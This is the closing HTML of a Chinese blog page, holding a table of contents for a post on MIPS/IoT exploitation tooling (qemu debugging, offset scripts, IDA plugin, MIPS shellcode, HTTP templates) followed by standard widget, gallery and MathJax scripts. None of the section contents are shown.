			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#qemu用户模式动态调试脚本"><span class="toc-number">2.</span> <span class="toc-text">qemu用户模式动态调试脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#计算偏移脚本"><span class="toc-number">3.</span> <span class="toc-text">计算偏移脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IDA插件"><span class="toc-number">4.</span> <span class="toc-text">IDA插件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mips-shellcode"><span class="toc-number">5.</span> <span class="toc-text">mips shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP报文模版"><span class="toc-number">6.</span> <span class="toc-text">HTTP报文模版</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"superSample":2,"hOffset":0,"vOffset":-20,"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>




</html>
